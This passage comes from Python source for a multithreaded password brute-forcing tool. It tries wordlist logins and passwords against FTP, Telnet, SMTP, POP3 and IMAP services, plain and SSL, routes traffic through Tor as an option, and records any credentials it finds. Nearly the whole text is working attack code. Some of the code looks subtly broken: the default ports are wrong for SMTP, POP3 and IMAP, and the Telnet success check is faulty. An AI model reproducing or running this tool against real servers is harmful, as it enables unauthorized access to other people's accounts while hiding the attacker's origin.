                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    ftps.connect(options['target'], options['port'], timeout=5)

                else:

                    ftps.connect(options['target'], 21, timeout=5)

                ftps.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                

            except ftplib.error_perm:


                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

    
    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_telnet(options, wordlists):
    
    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    telnet = telnetlib.Telnet()

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    telnet.open(options['target'], options['port'], timeout=5)

                else:

                    telnet.open(options['target'], 23, timeout=5)


                telnet.read_until(b"login: ")
                telnet.write(login.encode('ascii') + b"\n")
                
                telnet.read_until(b"Password: ")
                telnet.write(password.encode('ascii') + b"\n")

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

            except EOFError:

                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue


            try:

                if options['port'] != 0:

                    telnet.open(options['target'], options['port'], timeout=5)

                else:

                    telnet.open(options['target'], 23)

                telnet.read_until(b"login: ")
                telnet.write(login.encode('ascii') + b"\n")
                
                telnet.read_until(b"Password: ")
                telnet.write(password.encode('ascii') + b"\n")

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                
            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

            except EOFError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()
            
            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

        elif check_type_crack() == 'crack_login':

            try:
            
                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    telnet.open(options['target'], options['port'], timeout=5)

                else:

                    telnet.open(options['target'], 23, timeout=5)

                telnet.read_until(b"login: ")
                telnet.write(login.encode('ascii') + b"\n")
                
                telnet.read_until(b"Password: ")
                telnet.write(password.encode('ascii') + b"\n")

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue
                
                
            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

            except EOFError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()
            
            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue

        else:

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    telnet.open(options['target'], options['port'], timeout=5)

                else:

                    telnet.open(options['target'], 23, timeout=5)

                telnet.read_until(b"login: ")
                telnet.write(login.encode('ascii') + b"\n")
                
                telnet.read_until(b"Password: ")
                telnet.write(password.encode('ascii') + b"\n")

                found_credentials['login'] = login
                found_credentials['password'] = password

                wordlists.task_done()
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

            except EOFError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()
            
            except:

                if options['tor_connection']:

                    tor_error = True

                else:

                    stop_all_thread = True
                    error_msg = "[CRITICAL] CONNECTION ERROR"
                    continue
    
    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_smtp(options, wordlists):
    
    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except smtplib.SMTPAuthenticationError:

                stop_all_thread = True
                continue

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
            
            except smtplib.SMTPAuthenticationError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_login':

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except smtplib.SMTPAuthenticationError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        else:

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except smtplib.SMTPAuthenticationError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

    
    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_smtps(options, wordlists):
    
    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP_SSL(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP_SSL(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except smtplib.SMTPAuthenticationError:

                stop_all_thread = True
                continue

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP_SSL(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP_SSL(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
            
            except smtplib.SMTPAuthenticationError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_login':

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP_SSL(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP_SSL(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except smtplib.SMTPAuthenticationError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

        else:

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    smtp = smtplib.SMTP_SSL(options['target'], options['port'], timeout=5)

                else:

                    smtp = smtplib.SMTP_SSL(options['target'], 161, timeout=5)

                smtp.login(user=login, passwd=password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except smtplib.SMTPAuthenticationError:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except ConnectionRefusedError:

                error_msg = "[CRTICAL] Connection Resfused"
                stop_all_thread = True
                continue

            except smtplib.SMTPNotSupportedError:

                error_msg = "[CRITICAL] Server not support AUTH command"
                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue

    
    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_pop3(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    pop = poplib.POP3(options['target'], options['port'], timeout=5)

                else:

                    pop = poplib.POP3(options['target'], 21, timeout=5)

                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except poplib.error_proto:

                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    pop = poplib.POP3(options['target'], options['port'], timeout=5)

                else:

                    pop = poplib.POP3(options['target'], 21, timeout=5)

                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            
            except poplib.error_proto:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_login':

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    pop = poplib.POP3(options['target'], options['port'], timeout=5)

                else:

                    pop = poplib.POP3(options['target'], 21, timeout=5)

                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except poplib.error_proto:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        else:

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    pop = poplib.POP3(options['target'], options['port'], timeout=5)

                else:

                    pop = poplib.POP3(options['target'], 21, timeout=5)

                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                

            except poplib.error_proto:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_pop3s(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    pop = poplib.POP3_SSL(options['target'], options['port'], timeout=5)

                else:

                    pop = poplib.POP3_SSL(options['target'], 21, timeout=5)

                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except poplib.error_proto:

                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()
            
            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    pop = poplib.POP3_SSL(options['target'], options['port'], timeout=5)

                else:

                    pop = poplib.POP3_SSL(options['target'], 21, timeout=5)
                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            
            except poplib.error_proto:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_login':

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:


                    pop = poplib.POP3_SSL(options['target'], options['port'], timeout=5)
                else:


                    pop = poplib.POP3_SSL(options['target'], 21, timeout=5)
                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except poplib.error_proto:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        else:

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    pop = poplib.POP3_SSL(options['target'], options['port'], timeout=5)

                else:

                    pop = poplib.POP3_SSL(options['target'], 21, timeout=5)

                pop.user(login)
                pop.pass_(password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                

            except poplib.error_proto:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_imap4(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except imaplib.IMAP4.error:

                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            
            except imaplib.IMAP4.error:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_login':

            try:

                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except imaplib.IMAP4.error:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        else:

            try:

                values = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                

            except imaplib.IMAP4.error:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()

def crack_imap4s(options, wordlists):

    global tor_error
    global stop_all_thread
    global error_msg
    global found_credentials
    global random_user_agent
    global error_message
    global parse_data
    global tor_is_connected
    global is_logged
    global parse_cookies

    proxy = {}

    

    while True:

        if stop_all_thread:

            break

        if tor_error:

            break

        if options['tor_connection']:

            proxy['http'] = "socks5://127.0.0.1:9050"
            proxy['https'] = "socks5://127.0.0.1:9050"

            if tor_is_connected() == False:

                tor_error = True

        if check_type_crack() == 'normal_login':

            login = options['login']
            password = options['password']

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4_SSL(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4_SSL(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue

            except imaplib.IMAP4.error:

                stop_all_thread = True
                continue

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_password':

            try:

                login = options['login']
                password = wordlists.get_nowait()

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4_SSL(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4_SSL(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            
            except imaplib.IMAP4.error:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        elif check_type_crack() == 'crack_login':

            try:
            
                login = wordlists.get_nowait()
                password = options['password']

            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4_SSL(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4_SSL(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                
            except imaplib.IMAP4.error:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

        else:

            try:

                values = wordlists.get_nowait()
            
            except queue.Empty:

                alert_message("credentials not found with this wordlist")
                stop_all_thread = True
                continue

            login = values[0]
            password = values[1]

            try:

                if options['port'] != 0:

                    imap = imaplib.IMAP4_SSL(options['target'], options['port'], timeout=5)

                else:

                    imap = imaplib.IMAP4_SSL(options['target'], 21, timeout=5)

                imap.login(login, password)

                found_credentials['login'] = login
                found_credentials['password'] = password
                stop_all_thread = True
                continue
                

            except imaplib.IMAP4.error:

                if options['verbose']:

                    if stop_all_thread == False:

                        cprint(f"[TRIED] LOGIN: {login} PASSWORD: {password}", 'cyan')

                wordlists.task_done()

            except TimeoutError:

                error_msg = "[CRITICAL] Timeout Error"
                stop_all_thread = True
                continue
            
            except ConnectionRefusedError:

                error_msg = "[CRITICAL] Connection Refused"
                stop_all_thread = True
                continue

    if tor_error:

        error_msg = "[CRITICAL] Tor not is connected"

        error_message()


def fenrir(options):
    global load_wordlist
    global intertool_wordlists
    global crack_https_post
    global stop_all_thread
    global found_credentials
    global error_msg
    global error_message

    if options['protocol'] == 'https-post':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])
            

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

            wordlist = intertool_wordlists([options['login_wordlist'], options['password_wordlist']])


        for t in range(options['threads']):

            thread_working.append(threading.Thread(target=crack_https_post, args=(options, wordlist)))

        for t in thread_working:

            t.start()


        try:

            while stop_all_thread == False:

                continue

            if found_credentials['login'] != None and found_credentials['password'] != None:

                for x in thread_working:

                    x.join()

                cprint(f"[FOUND] LOGIN: {found_credentials['login']} PASSWORD: {found_credentials['password']}", 'green')
                
                if options['output_file'] != None:

                    append_output(credentials=found_credentials, options=options)


        except KeyboardInterrupt:

            stop_all_thread = True
            for t in thread_working:
                try:
                    t.join()
                except KeyboardInterrupt:
                    continue

            exit()

        exit()

    elif options['protocol'] == 'http-post':

        thread_working = []

        wordlist = queue.Queue()

        if check_type_crack() == 'crack_password':

            wordlist = load_wordlist(options['password_wordlist'])

        elif check_type_crack() == 'crack_login':

            wordlist = load_wordlist(options['login_wordlist'])


        elif check_type_crack() == 'full_crack':

